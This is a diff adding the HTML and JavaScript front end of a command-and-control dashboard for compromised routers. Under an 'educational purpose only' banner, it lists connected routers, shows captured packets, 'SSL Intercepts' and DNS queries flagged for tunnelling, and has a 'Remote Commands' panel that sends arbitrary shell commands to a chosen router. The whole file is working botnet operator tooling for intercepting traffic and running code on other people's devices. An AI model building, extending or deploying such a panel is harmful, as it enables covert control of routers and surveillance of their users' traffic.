@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Dashboard - Educational Router Monitor</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f1419;
+            color: #e1e8ed;
+            line-height: 1.6;
+        }
+        
+        .header {
+            background: #1a1f2e;
+            padding: 1rem 2rem;
+            border-bottom: 1px solid #2f3336;
+        }
+        
+        .header h1 {
+            font-size: 1.5rem;
+            color: #1d9bf0;
+        }
+        
+        .warning {
+            background: #f59e0b;
+            color: #000;
+            padding: 0.5rem 1rem;
+            text-align: center;
+            font-weight: bold;
+        }
+        
+        .container {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            height: calc(100vh - 120px);
+        }
+        
+        .sidebar {
+            background: #1a1f2e;
+            border-right: 1px solid #2f3336;
+            padding: 1rem;
+            overflow-y: auto;
+        }
+        
+        .main {
+            padding: 1rem;
+            overflow-y: auto;
+        }
+        
+        .client-card {
+            background: #253341;
+            border: 1px solid #2f3336;
+            border-radius: 8px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .client-card:hover {
+            background: #2d3748;
+            border-color: #1d9bf0;
+        }
+        
+        .client-card.active {
+            background: #1d9bf0;
+            color: #fff;
+        }
+        
+        .client-card.offline {
+            opacity: 0.6;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 0.5rem;
+        }
+        
+        .status-indicator.online {
+            background: #10b981;
+        }
+        
+        .status-indicator.offline {
+            background: #ef4444;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid #2f3336;
+        }
+        
+        .tab {
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        
+        .tab:hover {
+            color: #1d9bf0;
+        }
+        
+        .tab.active {
+            color: #1d9bf0;
+            border-bottom-color: #1d9bf0;
+        }
+        
+        .content-panel {
+            display: none;
+        }
+        
+        .content-panel.active {
+            display: block;
+        }
+        
+        .traffic-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .traffic-table th,
+        .traffic-table td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid #2f3336;
+        }
+        
+        .traffic-table th {
+            background: #253341;
+            font-weight: 600;
+            position: sticky;
+            top: 0;
+        }
+        
+        .traffic-table tr:hover {
+            background: #253341;
+        }
+        
+        .command-box {
+            background: #253341;
+            border: 1px solid #2f3336;
+            border-radius: 8px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+        
+        .command-box input,
+        .command-box select {
+            background: #0f1419;
+            border: 1px solid #2f3336;
+            color: #e1e8ed;
+            padding: 0.5rem;
+            border-radius: 4px;
+            width: 100%;
+            margin-bottom: 0.5rem;
+        }
+        
+        .command-box button {
+            background: #1d9bf0;
+            color: #fff;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        
+        .command-box button:hover {
+            background: #1a8cd8;
+        }
+        
+        .log-viewer {
+            background: #0f1419;
+            border: 1px solid #2f3336;
+            border-radius: 4px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        
+        .stat-card {
+            background: #253341;
+            border: 1px solid #2f3336;
+            border-radius: 8px;
+            padding: 1rem;
+        }
+        
+        .stat-card h3 {
+            font-size: 0.9rem;
+            color: #71767b;
+            margin-bottom: 0.5rem;
+        }
+        
+        .stat-card .value {
+            font-size: 2rem;
+            font-weight: 600;
+            color: #1d9bf0;
+        }
+        
+        .realtime-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #10b981;
+            border-radius: 50%;
+            margin-left: 0.5rem;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        ⚠️ EDUCATIONAL PURPOSE ONLY - Use responsibly in controlled environments
+    </div>
+    
+    <div class="header">
+        <h1>C2 Dashboard - Router Traffic Monitor</h1>
+    </div>
+    
+    <div class="container">
+        <div class="sidebar">
+            <h2 style="margin-bottom: 1rem;">Connected Routers</h2>
+            <div id="clientList"></div>
+        </div>
+        
+        <div class="main">
+            <div class="tabs">
+                <div class="tab active" data-tab="overview">Overview</div>
+                <div class="tab" data-tab="traffic">Traffic <span class="realtime-indicator"></span></div>
+                <div class="tab" data-tab="ssl">SSL Intercepts</div>
+                <div class="tab" data-tab="dns">DNS Queries</div>
+                <div class="tab" data-tab="commands">Commands</div>
+            </div>
+            
+            <div id="overview" class="content-panel active">
+                <h2>System Overview</h2>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <h3>Total Clients</h3>
+                        <div class="value" id="totalClients">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Online Now</h3>
+                        <div class="value" id="onlineClients">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Packets Captured</h3>
+                        <div class="value" id="totalPackets">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <h3>SSL Intercepts</h3>
+                        <div class="value" id="totalSSL">0</div>
+                    </div>
+                </div>
+                
+                <h3 style="margin: 1rem 0;">Recent Activity</h3>
+                <div class="log-viewer" id="activityLog"></div>
+            </div>
+            
+            <div id="traffic" class="content-panel">
+                <h2>Real-time Traffic Monitor</h2>
+                <table class="traffic-table">
+                    <thead>
+                        <tr>
+                            <th>Time</th>
+                            <th>Source</th>
+                            <th>Destination</th>
+                            <th>Protocol</th>
+                            <th>Size</th>
+                            <th>Direction</th>
+                        </tr>
+                    </thead>
+                    <tbody id="trafficTable"></tbody>
+                </table>
+            </div>
+            
+            <div id="ssl" class="content-panel">
+                <h2>SSL/TLS Intercepts</h2>
+                <table class="traffic-table">
+                    <thead>
+                        <tr>
+                            <th>Time</th>
+                            <th>Hostname</th>
+                            <th>Client IP</th>
+                            <th>Certificate Info</th>
+                        </tr>
+                    </thead>
+                    <tbody id="sslTable"></tbody>
+                </table>
+            </div>
+            
+            <div id="dns" class="content-panel">
+                <h2>DNS Query Log</h2>
+                <table class="traffic-table">
+                    <thead>
+                        <tr>
+                            <th>Time</th>
+                            <th>Domain</th>
+                            <th>Type</th>
+                            <th>Tunnel</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dnsTable"></tbody>
+                </table>
+            </div>
+            
+            <div id="commands" class="content-panel">
+                <h2>Remote Commands</h2>
+                <div class="command-box">
+                    <select id="commandType">
+                        <option value="execute">Execute Command</option>
+                        <option value="get_status">Get Status</option>
+                        <option value="restart_service">Restart Service</option>
+                    </select>
+                    <input type="text" id="commandInput" placeholder="Enter command...">
+                    <button onclick="sendCommand()">Send Command</button>
+                </div>
+                
+                <h3>Command History</h3>
+                <div class="log-viewer" id="commandLog"></div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let selectedClient = null;
+        let ws = null;
+        
+        // Initialize dashboard
+        async function init() {
+            loadClients();
+            setInterval(loadClients, 5000);
+            
+            // Set up tab switching
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.addEventListener('click', () => {
+                    switchTab(tab.dataset.tab);
+                });
+            });
+            
+            // Connect to real-time traffic WebSocket
+            connectRealtimeTraffic();
+        }
+        
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.content-panel').forEach(p => p.classList.remove('active'));
+            
+            document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
+            document.getElementById(tabName).classList.add('active');
+            
+            // Load data for the selected tab
+            if (selectedClient) {
+                switch(tabName) {
+                    case 'traffic':
+                        loadTraffic(selectedClient);
+                        break;
+                    case 'ssl':
+                        loadSSL(selectedClient);
+                        break;
+                    case 'dns':
+                        loadDNS(selectedClient);
+                        break;
+                }
+            }
+        }
+        
+        async function loadClients() {
+            const response = await fetch('/api/clients');
+            const clients = await response.json();
+            
+            const clientList = document.getElementById('clientList');
+            clientList.innerHTML = '';
+            
+            let totalClients = 0;
+            let onlineClients = 0;
+            
+            clients.forEach(client => {
+                totalClients++;
+                if (client.online) onlineClients++;
+                
+                const card = document.createElement('div');
+                card.className = `client-card ${client.online ? '' : 'offline'} ${client.client_id === selectedClient ? 'active' : ''}`;
+                card.innerHTML = `
+                    <div>
+                        <span class="status-indicator ${client.online ? 'online' : 'offline'}"></span>
+                        <strong>${client.client_id}</strong>
+                    </div>
+                    <div style="margin-left: 1.5rem; font-size: 0.9rem; color: #71767b;">
+                        ${client.router_model}<br>
+                        ${client.ip_address}
+                    </div>
+                `;
+                card.onclick = () => selectClient(client.client_id);
+                clientList.appendChild(card);
+            });
+            
+            document.getElementById('totalClients').textContent = totalClients;
+            document.getElementById('onlineClients').textContent = onlineClients;
+        }
+        
+        function selectClient(clientId) {
+            selectedClient = clientId;
+            document.querySelectorAll('.client-card').forEach(card => {
+                card.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+            
+            // Reload current tab data
+            const activeTab = document.querySelector('.tab.active').dataset.tab;
+            switchTab(activeTab);
+            
+            // Reconnect WebSocket for new client
+            if (ws) ws.close();
+            connectRealtimeTraffic();
+        }
+        
+        async function loadTraffic(clientId) {
+            const response = await fetch(`/api/traffic?client_id=${clientId}&limit=100`);
+            const traffic = await response.json();
+            
+            const tbody = document.getElementById('trafficTable');
+            tbody.innerHTML = '';
+            
+            traffic.forEach(packet => {
+                const row = tbody.insertRow();
+                row.innerHTML = `
+                    <td>${new Date(packet.timestamp).toLocaleTimeString()}</td>
+                    <td>${packet.src_ip}:${packet.src_port}</td>
+                    <td>${packet.dst_ip}:${packet.dst_port}</td>
+                    <td>${packet.protocol}</td>
+                    <td>${packet.packet_size}</td>
+                    <td>${packet.direction}</td>
+                `;
+            });
+            
+            document.getElementById('totalPackets').textContent = traffic.length;
+        }
+        
+        async function loadSSL(clientId) {
+            const response = await fetch(`/api/ssl-intercepts?client_id=${clientId}`);
+            const intercepts = await response.json();
+            
+            const tbody = document.getElementById('sslTable');
+            tbody.innerHTML = '';
+            
+            intercepts.forEach(intercept => {
+                const row = tbody.insertRow();
+                row.innerHTML = `
+                    <td>${new Date(intercept.timestamp).toLocaleTimeString()}</td>
+                    <td>${intercept.hostname}</td>
+                    <td>${intercept.client_ip}</td>
+                    <td>${intercept.cert_info}</td>
+                `;
+            });
+            
+            document.getElementById('totalSSL').textContent = intercepts.length;
+        }
+        
+        async function loadDNS(clientId) {
+            const response = await fetch(`/api/dns-queries?client_id=${clientId}`);
+            const queries = await response.json();
+            
+            const tbody = document.getElementById('dnsTable');
+            tbody.innerHTML = '';
+            
+            queries.forEach(query => {
+                const row = tbody.insertRow();
+                row.innerHTML = `
+                    <td>${new Date(query.timestamp).toLocaleTimeString()}</td>
+                    <td>${query.query_domain}</td>
+                    <td>${query.query_type}</td>
+                    <td>${query.is_tunnel ? '⚠️ Yes' : 'No'}</td>
+                `;
+            });
+        }
+        
+        function connectRealtimeTraffic() {
+            if (!selectedClient) return;
+            
+            ws = new WebSocket(`ws://${window.location.host}/ws/traffic?client_id=${selectedClient}`);
+            
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                if (data.type === 'traffic') {
+                    updateRealtimeTraffic(data.data);
+                }
+            };
+        }
+        
+        function updateRealtimeTraffic(packets) {
+            const tbody = document.getElementById('trafficTable');
+            
+            packets.forEach(packet => {
+                const row = tbody.insertRow(0);
+                row.innerHTML = `
+                    <td>${new Date(packet.timestamp * 1000).toLocaleTimeString()}</td>
+                    <td>${packet.src_ip}:${packet.src_port}</td>
+                    <td>${packet.dst_ip}:${packet.dst_port}</td>
+                    <td>${packet.protocol}</td>
+                    <td>${packet.size}</td>
+                    <td>${packet.direction}</td>
+                `;
+                
+                // Keep only last 100 rows
+                if (tbody.rows.length > 100) {
+                    tbody.deleteRow(tbody.rows.length - 1);
+                }
+            });
+        }
+        
+        async function sendCommand() {
+            if (!selectedClient) {
+                alert('Please select a client first');
+                return;
+            }
+            
+            const commandType = document.getElementById('commandType').value;
+            const commandInput = document.getElementById('commandInput').value;
+            
+            const command = {
+                client_id: selectedClient,
+                command: {
+                    type: commandType,
+                    command: commandInput
+                }
+            };
+            
+            const response = await fetch('/api/command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(command)
+            });
+            
+            const result = await response.json();
+            
+            const log = document.getElementById('commandLog');
+            log.innerHTML = `<div>${new Date().toLocaleTimeString()} - ${commandType}: ${JSON.stringify(result)}</div>` + log.innerHTML;
+        }
+        
+        // Initialize on load
+        init();
+    </script>
+</body>
+</html>
